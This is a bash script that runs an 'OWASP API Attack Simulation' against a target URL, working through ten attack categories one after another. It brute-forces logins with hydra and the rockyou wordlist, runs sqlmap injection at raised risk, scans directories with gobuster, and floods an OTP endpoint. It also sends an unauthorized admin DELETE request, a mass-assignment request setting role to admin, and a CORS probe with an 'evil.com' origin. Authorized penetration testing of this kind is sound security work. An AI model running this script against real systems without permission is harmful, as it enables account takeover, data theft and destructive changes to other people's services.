#!/bin/bash

TARGET="http://196.168.100.10"   # Replace with your real test API
LOG_DIR="/opt/api_attack_logs"
mkdir -p "$LOG_DIR"

echo "[+] Starting OWASP API Attack Simulation on $TARGET"
sleep 1

# 1. BOLA - Broken Object Level Authorization
echo "[*] [1] Testing BOLA..." | tee -a "$LOG_DIR/1_bola.log"
curl -s -H "Authorization: Bearer fake-token" "$TARGET/api/users/2" | tee -a "$LOG_DIR/1_bola.log"

# 2. Broken Authentication - Brute-force Login
echo "[*] [2] Testing Broken Authentication..." | tee -a "$LOG_DIR/2_auth.log"
hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" http-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid" -t 4 -f | tee -a "$LOG_DIR/2_auth.log"

# 3. Excessive Data Exposure
echo "[*] [3] Testing Excessive Data Exposure..." | tee -a "$LOG_DIR/3_exposure.log"
curl -s "$TARGET/api/profile" | jq . | tee -a "$LOG_DIR/3_exposure.log"

# 4. Lack of Rate Limiting
echo "[*] [4] Testing Rate Limiting..." | tee -a "$LOG_DIR/4_rate_limit.log"
for i in {1..20}; do
  curl -s "$TARGET/api/validate?otp=$RANDOM" &
done
wait
echo "[*] Flood completed." | tee -a "$LOG_DIR/4_rate_limit.log"

# 5. Broken Function Level Auth
echo "[*] [5] Testing Function-Level Authorization..." | tee -a "$LOG_DIR/5_func_auth.log"
curl -X DELETE -H "Authorization: Bearer fake-user-token" "$TARGET/api/admin/delete/5" | tee -a "$LOG_DIR/5_func_auth.log"

# 6. Mass Assignment
echo "[*] [6] Testing Mass Assignment..." | tee -a "$LOG_DIR/6_mass_assignment.log"
curl -X POST -H "Content-Type: application/json" "$TARGET/api/users/2" \
     -d '{"username":"attacker","role":"admin"}' | tee -a "$LOG_DIR/6_mass_assignment.log"

# 7. Security Misconfiguration - CORS Check
echo "[*] [7] Testing Security Misconfiguration..." | tee -a "$LOG_DIR/7_misconfig.log"
curl -I -H "Origin: evil.com" "$TARGET/api/data" | tee -a "$LOG_DIR/7_misconfig.log"

# 8. Injection (SQLi)
echo "[*] [8] Testing Injection with sqlmap..." | tee -a "$LOG_DIR/8_injection.log"
sqlmap -u "$TARGET/api/users?id=1" --batch --level=2 --risk=2 --output-dir="$LOG_DIR/sqlmap_results"

# 9. Improper Asset Management - Endpoint Discovery
echo "[*] [9] Scanning for Hidden API Versions..." | tee -a "$LOG_DIR/9_assets.log"
gobuster dir -u "$TARGET/" -w /usr/share/wordlists/dirb/common.txt -o "$LOG_DIR/9_assets.log"

# 10. Insufficient Logging & Monitoring - Silent Probing
echo "[*] [10] Simulating Blind Probing (No Alert Trigger)..." | tee -a "$LOG_DIR/10_logging.log"
curl -s -X POST "$TARGET/api/login" -d '{"username":"user","password":"wrong"}' > /dev/null
echo "[*] Probed login with invalid creds, check if this was logged!" | tee -a "$LOG_DIR/10_logging.log"

echo "[+] Simulation complete. Check logs in $LOG_DIR"